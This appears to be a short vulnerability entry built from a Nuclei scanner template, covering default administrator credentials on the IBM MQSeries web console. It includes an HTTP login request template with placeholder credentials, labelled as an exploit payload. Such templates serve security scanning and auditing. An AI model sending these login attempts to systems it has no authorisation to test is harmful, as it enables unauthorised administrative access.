# Vulnerability: IBM MQSeries Web Console Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`ibm-mqseries-default-login.yaml`)

## Description
IBM MQ and REST API default admin credentials were discovered. An unauthenticated, remote attacker can exploit this gain privileged or administrator access to the system.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ibmmq/console/j_security_check HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/ibmmq/console/login.html

j_username={{username}}&j_password={{password}}
```

